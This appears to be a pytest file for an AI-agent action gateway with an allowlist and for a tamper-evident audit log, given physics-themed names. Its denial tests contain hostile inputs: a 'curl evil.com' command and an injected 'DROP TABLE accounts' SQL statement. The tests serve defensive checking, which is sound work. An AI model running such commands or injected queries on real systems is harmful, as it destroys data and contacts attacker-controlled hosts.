import os
import sys
import pytest

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from src.hawking_information_preservation_engine import (
    HolographicEventHorizonPreserver,
    DeterministicVerificationGateway
)


def test_deterministic_verification_gateway():
    allowed_set = {"GIT_STATUS", "POSTGRES_SELECT", "FILE_READ"}

    # Allowed action with safe payload
    ok, verdict, reason = DeterministicVerificationGateway.evaluate_preflight_gate(
        {"action": "GIT_STATUS", "command": "git status"}, allowed_set
    )
    assert ok is True
    assert verdict == "ALLOW"

    # Action outside allowed set
    ok, verdict, reason = DeterministicVerificationGateway.evaluate_preflight_gate(
        {"action": "RAW_EXECUTE_SOCKET", "command": "curl evil.com"}, allowed_set
    )
    assert ok is False
    assert verdict == "DENY"

    # Forbidden AST pattern inside allowed action
    ok, verdict, reason = DeterministicVerificationGateway.evaluate_preflight_gate(
        {"action": "POSTGRES_SELECT", "query": "SELECT * FROM users; DROP TABLE accounts;"}, allowed_set
    )
    assert ok is False
    assert verdict == "DENY"
    assert "Forbidden pattern 'DROP TABLE'" in reason


def test_holographic_event_horizon_unitarity():
    preserver = HolographicEventHorizonPreserver()

    # Record safe execution
    preserver.record_event_horizon("agent-1", "READ", {"key": "val1"}, "ALLOW", "Verified")
    # Record blocked attack (information must not disappear)
    preserver.record_event_horizon("agent-2", "DROP_TABLE", {"table": "logs"}, "DENY", "AST Violation")
    # Record third action
    preserver.record_event_horizon("agent-3", "PAYMENT", {"amount": 50}, "ALLOW", "Within limit")

    # Verify total information conservation across horizon
    assert preserver.verify_horizon_unitarity() is True
    assert len(preserver.horizon_records) == 3

    # Tampering with any historical record in the horizon must fail unitarity
    preserver.horizon_records[1]["verdict"] = "ALLOW"
    assert preserver.verify_horizon_unitarity() is False


if __name__ == "__main__":
    test_deterministic_verification_gateway()
    test_holographic_event_horizon_unitarity()
    print("[OK] ALL HAWKING INFORMATION PRESERVATION TESTS PASSED!")
